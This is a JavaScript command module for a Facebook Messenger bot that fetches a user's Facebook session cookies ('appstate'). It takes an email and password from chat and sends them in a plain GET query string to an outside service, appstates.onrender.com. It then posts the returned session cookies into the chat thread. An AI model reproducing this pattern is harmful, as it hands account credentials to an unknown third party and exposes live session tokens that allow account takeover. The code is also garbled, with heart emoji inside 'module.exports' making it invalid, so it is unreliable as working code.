const axios = require('axios');

module.❤️exports❤️.config = {
  name: "cookie",
  version: "1.0",
  role: 0,
  info: "get your appstate without extension",
  credits: "Mark Hitsuraan",
  aliases: ["fbstate","appstate"], 
  cd: 3
};

module.❤️exports❤️.run = async function ({ api, event, args, chat }) {

  if (args.length !== 2) {
    return chat.reply("Please provide email and password.\n\nexample: appstateget [email] [password]", event.threadID, event.messageID);
  }

  //const { messageID } = event;

  const [email, password] = args.map(arg => arg.trim());

  //const marky = await chat.reply("Please bear with me while I ponder your request...");
  api.setMessageReaction("⏳", event.messageID, () => {}, true);
  const marky = await new Promise(resolve => {
        chat.reply("⏳ Getting your appstate/cookie, please wait...", event.threadID, (err, info1) => {
        resolve(info1);
       }, event.messageID);
      });

  try {
    const mark = await axios.get(`https://appstates.onrender.com/fbcookie?user=${email}&pass=${password}`);
    const userData = mark.data;

    api.setMessageReaction("✅", event.messageID, () => {}, true);
    
    const formattedData = userData.map(cookie => ({
      "key": cookie.key,
      "value": cookie.value,
      "domain": cookie.domain,
      "path": cookie.path,
      "hostOnly": cookie.hostOnly,
      "creation": cookie.creation,
      "lastAccessed": cookie.lastAccessed
    }));
     chat.edit(JSON.stringify(formattedData, null, 4), marky.messageID);
  } catch (error) {
    console.error("error", error);
    chat.reply("error bai, change password ka muna tapos subukan mo ulit.", event.threadID, event.messageID);
  }
}
